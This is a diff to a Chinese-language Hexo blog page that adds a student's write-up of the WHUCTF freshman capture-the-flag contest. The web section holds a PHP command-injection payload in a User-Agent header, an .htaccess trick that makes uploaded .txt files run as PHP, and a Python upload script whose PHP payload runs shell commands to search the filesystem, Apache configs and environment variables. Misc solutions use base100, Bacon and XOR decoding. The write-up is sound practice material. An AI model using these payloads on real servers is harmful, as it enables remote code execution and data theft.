@@ -355,6 +355,106 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/24/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Ducklinger">
+      <meta itemprop="description" content="分享日常">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ducklinger">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/10/24/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9B/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-10-24 20:43:24" itemprop="dateCreated datePublished" datetime="2025-10-24T20:43:24+08:00">2025-10-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-26 20:35:29" itemprop="dateModified" datetime="2025-10-26T20:35:29+08:00">2025-10-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="WHUCTF新生赛"><a href="#WHUCTF新生赛" class="headerlink" title="WHUCTF新生赛"></a>WHUCTF新生赛</h1><p>比上次有进步，但是还是写的很烂，还得加油</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>1.User-Agent</p>
+<p>在请求头User-Agent中构造Payload简单绕过一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /fla&#x27;</span> . <span class="string">&#x27;g&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在响应体中得到Flag：<strong>WHUCTF{KFc_kr42y_thURsDAy_V_Me_5o_N0w_Pl2Zz2zz}</strong></p>
+<p>2.井字棋小游戏</p>
+<p>发现是一个简单的纯前端小游戏，翻下代码发现棋盘的参数是数组gameBoard，直接在前端控制台修改一下参数gameBoard &#x3D; [‘X’, ‘X’ , ‘X’ , null , null, null, null ,null null],然后再点击一下棋盘直接获胜，弹出flag，在network里面看一下具体响应，再响应体里面发现flag：</p>
+<p><img src="/images/whuctf20251.png"></p>
+<p><img src="/images/whuctf20252.png"></p>
+<p>3.apacherrr</p>
+<p>一进去发现一大坨文字直接丢给ai解释大致意思是有三个站点uploaderrr.com，whuctf.com和主站点，先分别访问一下（抓包改一下host头）发现whuctf.com访问不了，uploaderrr.com是个文件上传的地方，一开始直接想到文件上传漏洞发现就算绕过了文件名检测也无法执行shell里面的代码，然后卡住了，问了下师傅＋提示，在网上搜了一下，<a target="_blank" rel="noopener" href="https://luokuang1.github.io/2024/07/23/%E6%B5%85%E8%B0%88ctf%E4%B8%AD-htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%90%E7%94%A8/%E5%AD%A6%E4%B9%A0%E4%BA%86%E4%B8%80%E4%B8%8B%E5%A4%A7%E4%BD%AC%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%8C%E5%A4%A7%E6%A6%82%E4%BA%86%E8%A7%A3%E5%88%B0%EF%BC%8C%E5%85%88%E4%B8%8A%E4%BC%A0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AE%A9apache%E6%8A%8A.txt%E6%96%87%E4%BB%B6%E5%BD%93%E6%88%90.php%E6%96%87%E4%BB%B6%E6%9D%A5%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E4%B8%BA">https://luokuang1.github.io/2024/07/23/%E6%B5%85%E8%B0%88ctf%E4%B8%AD-htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%90%E7%94%A8/学习了一下大佬的博客，大概了解到，先上传配置文件让apache把.txt文件当成.php文件来执行文件内容为</a></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt</span><br><span class="line"># php_value engine On</span><br></pre></td></tr></table></figure>
+
+<p>然后再上传一个shell.txt文件执行指令，让ai帮写了一下脚本上传文件＋扫目录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">TARGET_IP = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">TARGET_PORT = <span class="number">60483</span></span><br><span class="line">UPLOAD_URL = <span class="string">f&quot;http://<span class="subst">&#123;TARGET_IP&#125;</span>:<span class="subst">&#123;TARGET_PORT&#125;</span>/upload.php&quot;</span></span><br><span class="line">FLAG_URL = <span class="string">f&quot;http://<span class="subst">&#123;TARGET_IP&#125;</span>:<span class="subst">&#123;TARGET_PORT&#125;</span>/uploads/phpinfo.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(<span class="params">filename, content, content_type=<span class="string">&quot;text/plain&quot;</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&#x27;userfile&#x27;</span>: (filename, content, content_type),</span><br><span class="line">            <span class="string">&#x27;MAX_FILE_SIZE&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;30000&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;uploaderrr.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/133.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Origin&#x27;</span>: <span class="string">f&#x27;http://<span class="subst">&#123;TARGET_IP&#125;</span>:<span class="subst">&#123;TARGET_PORT&#125;</span>&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">f&#x27;http://<span class="subst">&#123;TARGET_IP&#125;</span>:<span class="subst">&#123;TARGET_PORT&#125;</span>/&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(UPLOAD_URL, files=files, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;successfully uploaded&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ 成功上传 <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ 上传 <span class="subst">&#123;filename&#125;</span> 失败，响应: <span class="subst">&#123;response.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 上传出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;whuctf2025.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/133.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.get(FLAG_URL, headers=headers, timeout=(<span class="number">15</span>, <span class="number">60</span>))</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n📜 终极全局搜索结果:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(response.text[:<span class="number">15000</span>])</span><br><span class="line">            <span class="comment"># 精准提取flag格式</span></span><br><span class="line">            <span class="keyword">import</span> re</span><br><span class="line">            real_flag = re.search(<span class="string">r&#x27;whuctf\&#123;[a-zA-Z0-9_]&#123;8,32&#125;\&#125;&#x27;</span>, response.text)</span><br><span class="line">            <span class="keyword">if</span> real_flag:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n🎉 找到终极 Flag: <span class="subst">&#123;real_flag.group()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ 获取结果失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 访问出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=== 终极全局搜索：系统级flag挖掘 ===&quot;</span>)</span><br><span class="line">    <span class="comment"># 脚本：执行5个核心系统命令，覆盖所有藏flag的可能</span></span><br><span class="line">    final_search_content = <span class="string">&quot;&quot;&quot;&lt;?php</span></span><br><span class="line"><span class="string">    echo &quot;=== 终极全局搜索flag ===&quot;;</span></span><br><span class="line"><span class="string">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 1. 搜索所有文件内容含whuctf&#123;（精准匹配，不遗漏）</span></span><br><span class="line"><span class="string">    echo &quot;🔍 1. 全系统搜索whuctf&#123;:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">    echo shell_exec(&#x27;grep -r &quot;whuctf&#123;&quot; / --include=&quot;*.php&quot; --include=&quot;*.txt&quot; --include=&quot;*.conf&quot; --include=&quot;*.ini&quot; 2&gt;/dev/null | grep -v &quot;proc&quot; | grep -v &quot;sys&quot;&#x27;);</span></span><br><span class="line"><span class="string">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 2. 读取Apache系统级配置文件（最可能藏flag）</span></span><br><span class="line"><span class="string">    echo &quot;🔍 2. 读取Apache系统配置:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">    $apache_configs = [&quot;/etc/apache2/apache2.conf&quot;, &quot;/etc/apache2/sites-available/000-default.conf&quot;];</span></span><br><span class="line"><span class="string">    foreach($apache_configs as $conf) &#123;</span></span><br><span class="line"><span class="string">        if(file_exists($conf)) &#123;</span></span><br><span class="line"><span class="string">            echo &quot;📄 $conf:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">            echo nl2br(shell_exec(&#x27;grep -E &quot;whuctf|flag&quot; &#x27; . escapeshellarg($conf) . &#x27; 2&gt;/dev/null&#x27;));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 3. 读取环境变量（CTF常用藏flag方式）</span></span><br><span class="line"><span class="string">    echo &quot;🔍 3. 系统环境变量:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">    echo shell_exec(&#x27;env | grep -i &quot;flag&quot;&#x27;);</span></span><br><span class="line"><span class="string">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 4. 搜索根目录下所有非系统文件（大小10-1000字节，符合flag文件特征）</span></span><br><span class="line"><span class="string">    echo &quot;🔍 4. 根目录可疑文件:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">    echo shell_exec(&#x27;find / -size +10c -size -1000c -type f ! -path &quot;/proc/*&quot; ! -path &quot;/sys/*&quot; ! -path &quot;/usr/*&quot; ! -path &quot;/lib/*&quot; 2&gt;/dev/null&#x27;);</span></span><br><span class="line"><span class="string">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 5. 读取/var/log日志（可能记录flag相关操作）</span></span><br><span class="line"><span class="string">    echo &quot;🔍 5. 日志文件中的flag:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">    echo shell_exec(&#x27;grep -r &quot;whuctf&#123;&quot; /var/log 2&gt;/dev/null | head -n 5&#x27;);</span></span><br><span class="line"><span class="string">    ?&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> upload_file(<span class="string">&quot;phpinfo.txt&quot;</span>, final_search_content):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)  <span class="comment"># 全局搜索耗时，延长等待</span></span><br><span class="line">    get_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== 终极搜索完成 ===&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>发现flag在环境变量里面：</p>
+<p><img src="/whuctf20253.png"></p>
+<hr>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>1.猫咪日记</p>
+<p>emoji表情首先想到base100解密一下得到flag</p>
+<p><a target="_blank" rel="noopener" href="https://wnkit.com/tool/base100-encoder-decoder">https://wnkit.com/tool/base100-encoder-decoder</a></p>
+<p>2.梅林午餐肉</p>
+<p>类似Bacon加密，把C换成A再Bacon解密一下得到flag</p>
+<p><a target="_blank" rel="noopener" href="https://www.metools.info/code/bacon193.html">https://www.metools.info/code/bacon193.html</a></p>
+<p>3.01AI-Problem（没接触过）</p>
+<p>让ai写一个模型根据modeified_mnist给的数据进行训练简单训练一下给出模型文件mnist_model.pth</p>
+<p>大致知道流程了，根据给出的训练数据集训练生成一个模型参数然后再根据这个参数识别图案得到密文：<code>20311369131496163448410746113142281526584940390147578688469508297899856840539896843521565163417523789</code> 然后再让读取一下<code>mnist_cnn_weights.pth</code> 里面的的内容得到:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odict_keys([&#x27;conv1.weight&#x27;, &#x27;conv1.bias&#x27;, &#x27;conv2.weight&#x27;, &#x27;conv2.bias&#x27;, &#x27;XOR_KEY_PART2_998244353ISAPRIME.weight&#x27;, &#x27;XOR_KEY_PART2_998244353ISAPRIME.bias&#x27;, &#x27;XOR_KEY_PART1_CIALLO0d000721.weight&#x27;, &#x27;XOR_KEY_PART1_CIALLO0d000721.bias&#x27;])</span><br></pre></td></tr></table></figure>
+
+<p>发现是异或解密密钥为<code>CIALLO0d000721998244353ISAPRIME</code>然后把密文转16进制进行异或解密得到flag</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -842,7 +942,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
